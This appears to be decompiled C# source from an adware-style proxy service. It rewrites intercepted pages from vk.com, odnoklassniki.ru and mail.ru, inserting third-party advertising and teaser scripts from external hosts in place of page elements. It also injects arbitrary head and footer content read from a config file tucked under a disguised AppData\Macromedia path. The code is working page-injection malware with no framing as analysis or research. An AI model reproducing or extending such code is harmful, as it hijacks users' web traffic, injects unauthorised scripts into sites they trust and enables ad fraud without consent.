using System;
using System.IO;
using System.Text.RegularExpressions;
using System.Xml;

namespace ProxyService;

public class XmlHelper
{
	public class VkAdBlock
	{
		public bool State;

		public string BigText = "";

		public string SmallText = "";

		public string ImageLink = "";

		public string Link = "";

		public string DownText = "";
	}

	public class YaAdBlock
	{
		public bool State;

		public string Titile = "";

		public string Direct = "";

		public string Text = "";

		public string Link = "";
	}

	public static string UrlRegEx { get; set; }

	public static string MatchRegEx { get; set; }

	public static string Replace { get; set; }

	public static string Insert { get; set; }

	public static string RepCount { get; set; }

	public static string Head { get; set; }

	public static string Foot { get; set; }

	public static VkAdBlock VkAds { get; set; }

	public static YaAdBlock YaAdsRight { get; set; }

	public static YaAdBlock YaAdsTop { get; set; }

	public static bool HasURL(string aUrL)
	{
		try
		{
			return Regex.IsMatch(aUrL, UrlRegEx);
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static void Load()
	{
		UrlRegEx = "";
		MatchRegEx = "";
		Replace = "";
		Insert = "";
		RepCount = "0";
		Head = "";
		Foot = "";
		VkAds = new VkAdBlock();
		YaAdsRight = new YaAdBlock();
		YaAdsTop = new YaAdBlock();
		try
		{
			TryGetXml();
		}
		catch (Exception)
		{
		}
	}

	public static string xmlfile()
	{
		if (File.Exists("D:\\debugmode.txt"))
		{
			return "D:\\Proxy1\\TestApp\\sample.txt";
		}
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\sample.txt";
	}

	public static void dbgFile(string a)
	{
		try
		{
			File.WriteAllText("D:\\1.txt", a);
		}
		catch (Exception)
		{
		}
	}

	public static int rnd(int from)
	{
		return new Random().Next(0, from);
	}

	public static string ChangeContent(string str, string url)
	{
		string text = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
		string text2 = "\r\n                    <script type='text/javascript'>var sid=50092,bid=2416;</script><script type='text/javascript' src='http://sochetat.net/vm.js'></script>";
		string newValue = text + " " + text2;
		string text3 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
		string text4 = "<script language='Javascript'>\r\nvar bntuniqid = 'TJqhtxV2nVSrCErN7364';\r\nvar bntuniqsid = '50092';\r\n</script>\r\n<script type='text/javascript' src='http://morenews1.net/viewt.js'></script>\r\n\r\n";
		string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
		string text5 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>";
		string[] array = new string[2] { text3, text4 };
		if (url.Contains("vk.com"))
		{
			str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue);
			str = str.Replace("<div id=\"left_blocks\"></div>", "");
			str = str.Replace("<div id=\"left_ads\"></div>", array[rnd(array.Length)]);
			return str;
		}
		if (url.Contains("odnoklassniki.ru"))
		{
			return str.Replace("</body></html>", "</body>" + text + "</html>");
		}
		if (url.Contains("mail.ru"))
		{
			str = str.Replace("<script>splashRadar('informers');</script>", text5 + " " + text2);
			str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
			return str;
		}
		return str;
	}

	private static string _ChangeContent(string str)
	{
		int count = 0;
		new Regex(MatchRegEx);
		string text = Regex.Replace(str, MatchRegEx, delegate(Match m)
		{
			if (count < int.Parse(RepCount))
			{
				count++;
				if (string.IsNullOrEmpty(Replace))
				{
					return m.Value + Insert;
				}
				return Replace + Insert;
			}
			count++;
			return m.Value;
		});
		if (!string.IsNullOrEmpty(Head))
		{
			text = Regex.Replace(text, "</head>", "</head>\n" + Head);
		}
		if (!string.IsNullOrEmpty(Foot))
		{
			text = Regex.Replace(text, "</body>", Foot + "\n</body>");
		}
		return text;
	}

	private static void TryGetXml()
	{
		string text = "";
		text = File.ReadAllText(xmlfile());
		string s = text;
		using XmlReader xmlReader = XmlReader.Create(new StringReader(s));
		xmlReader.ReadToFollowing("UrlRegEx");
		UrlRegEx = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("MatchRegEx");
		MatchRegEx = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Replace");
		Replace = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Insert");
		Insert = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("RepCount");
		RepCount = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Head");
		Head = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Foot");
		Foot = xmlReader.ReadElementContentAsString();
		xmlReader.ReadToFollowing("Vk");
		try
		{
			VkAds = new VkAdBlock();
			xmlReader.ReadToFollowing("State");
			VkAds.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("BigText");
			VkAds.BigText = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("SmallText");
			VkAds.SmallText = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("ImageLink");
			VkAds.ImageLink = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			VkAds.Link = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("DownText");
			VkAds.DownText = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex)
		{
			throw ex;
		}
		xmlReader.ReadToFollowing("Ya");
		try
		{
			YaAdsRight = new YaAdBlock();
			xmlReader.ReadToFollowing("State");
			YaAdsRight.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("Titile");
			YaAdsRight.Titile = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Text");
			YaAdsRight.Text = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Direct");
			YaAdsRight.Direct = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			YaAdsRight.Link = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex2)
		{
			throw ex2;
		}
		xmlReader.ReadToFollowing("YaTop");
		try
		{
			YaAdsTop = new YaAdBlock();
			xmlReader.ReadToFollowing("State");
			YaAdsTop.State = xmlReader.ReadElementContentAsInt() == 1;
			xmlReader.ReadToFollowing("Titile");
			YaAdsTop.Titile = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Text");
			YaAdsTop.Text = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Direct");
			YaAdsTop.Direct = xmlReader.ReadElementContentAsString();
			xmlReader.ReadToFollowing("Link");
			YaAdsTop.Link = xmlReader.ReadElementContentAsString();
		}
		catch (Exception ex3)
		{
			throw ex3;
		}
	}
}
